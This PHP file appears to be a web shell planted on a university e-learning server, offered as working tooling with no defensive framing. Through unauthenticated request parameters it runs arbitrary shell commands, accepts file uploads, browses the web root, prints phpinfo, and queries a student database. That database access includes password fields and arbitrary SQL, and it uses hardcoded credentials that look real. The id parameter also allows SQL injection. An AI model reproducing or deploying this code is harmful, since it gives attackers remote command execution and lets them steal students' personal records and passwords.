<?php
//ＢＩＧ５

fn_main();

function fn_main(){
  $GLOBALS['op'] = isset($_REQUEST['op']) ? $_REQUEST['op'] : '';
  switch($GLOBALS['op']){
  case 'h_help':
    echo 'h_help, h_info, q_passwd, q_info, q_all, q_qry, c_cmd, v_ls';
    break;
  case 'h_info':
    phpinfo();
    break;
  case 'q_passwd':
    fn_sql('ps', true);
    break;
  case 'q_info':
    fn_sql('id, name, sex, email, status, deptcd, grade, class');
    break;
  case 'q_all':
    fn_sql('*');
    break;
  case 'q_qry':
    fn_sql();
    break;
  case 'c_cmd':
    fn_cmd();
    break;
  case 'v_ls':
    fn_path();
    break;
  default:
    break;
  }
}

function fn_sql($qry = null, $onlyData = false){
  header("Content-Type:text/html; charset=utf-8");
  
  $json = isset($_REQUEST['json']);
  $id = isset($_REQUEST['id']) ? $_REQUEST['id'] : '';
  $range = isset($_REQUEST['range']) ? $_REQUEST['range'] : '1';  $db = (substr($id, 0, 1) == '5') ? 'academic_gra' : 'academic'; //專班生 or 一般生
  if($qry === null){
    isset($_REQUEST['qry']) or exit();
    $query = get_magic_quotes_gpc() ? stripslashes($_REQUEST['qry']) : $_REQUEST['qry']; //自定 query
    $db = isset($_REQUEST['db']) ? $_REQUEST['id'] : $db;
  }else{
    !empty($id) or exit();
    $query = "SELECT {$qry} FROM a11vstd_rec_tea WHERE id >= '{$id}' AND id < '" . ($id + $range) . "' ORDER BY id"; //多人
  }
  
  //連結 PostgreSQL (有錯誤不會顯示) default charset: utf-8
  
  $link = @pg_pconnect("host=140.123.30.12 dbname={$db} user=acauser password=!!acauser13") or exit();
  
  $table = array();
  $result = @pg_query($link, $query) or exit();
  while($row = @pg_fetch_array($result, null, PGSQL_ASSOC)){
    if($onlyData){ echo $row[$qry]; return; }
    $table[empty($id) ? count($table) : $row['id']] = $row;
  }
  
  @pg_close($cnx);

  
  if(count($table) == 0){ exit(); }

  if($json){
    
    if(function_exists('json_encode')){
      echo json_encode($table);
      return;
    }
    
    if(file_exists('json.php')){
      @include 'json.php';
    }else if(file_exists('json.qhq')){
      @include 'json.qhq';
    }else{
      exit();
    }
    
    $json = new Services_JSON();
    echo $json->encode($table);
    return;
  }
  
  echo "<pre>" . print_r($table, true) . "</pre>\n";
  return;
}

function fn_path($pathRule = ''){
  //正規化路徑
  $result = '';
  $pathRoot = "/datacenter/htdocs{$pathRule}";
  $pathWeb = "http://ecourse.elearning.ccu.edu.tw{$pathRule}";
  @chdir($pathRoot);
  $path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '.';
  $path = get_magic_quotes_gpc() ? stripslashes($path) : $path;
  $path = realpath($pathRoot . '/' . $path); 
  if(substr($path, 0, strlen($pathRoot)) != $pathRoot){
    $result = "禁止進入\n";
  }else{
    $pathBase = substr($path, strlen($pathRoot));
    if(is_file($path)){
      $pathFile = substr(strrchr($pathBase, '/'), 1);
      $result = "<a href=\"{$pathWeb}{$pathBase}\">{$pathFile}<a> - view\n";
    }else{
      $resultAry = explode("\n", htmlspecialchars(shell_exec("ls -a '{$path}'"), ENT_QUOTES));
      foreach($resultAry as $pathCur){
        $result .= "<a href=\"?op={$GLOBALS['op']}&path={$pathBase}/{$pathCur}\">{$pathCur}<a>\n";
      }
    }
  }
  
  if(true){ //echo start------------------------------------------------------
?>
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=big5" />
    <title></title>
  </head>
  <body>
    <big><big><pre><?php echo $result; ?></pre></big></big>
  </body>
</html>
<?php
  } //echo end--------------------------------------------------------

}

function fn_cmd(){
  if(isset($_FILES['upload']) && !empty($_FILES['upload']['tmp_name'])){
    if(@move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name'])){
      $result = 'upload: ok';
    }else{
      $result = 'upload: error';
    }
  }else if(isset($_REQUEST['cmd']) && !empty($_REQUEST['cmd'])){
    $cmd = get_magic_quotes_gpc() ? stripslashes($_REQUEST['cmd']) : $_REQUEST['cmd'];
    $result = shell_exec($cmd);
  }

  if(true){ //echo start------------------------------------------------------
?>
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=big5" />
    <title></title>
  </head>
  <body>
    <b>Command:</b>
    <dir>
      <form action="" method="post" enctype="multipart/form-data">
        <input type="text" name="cmd" value="<?php echo htmlspecialchars($cmd, ENT_QUOTES); ?>" />
        <input type="submit" value="Enter" />
        <input type="file" name="upload" />
      </form>
    </dir>
    <b>Result:</b>
    <dir>
      <pre><?php echo htmlspecialchars($result, ENT_QUOTES); ?></pre>
    </dir>
  </body>
</html>
<?php
  } //echo end--------------------------------------------------------

}

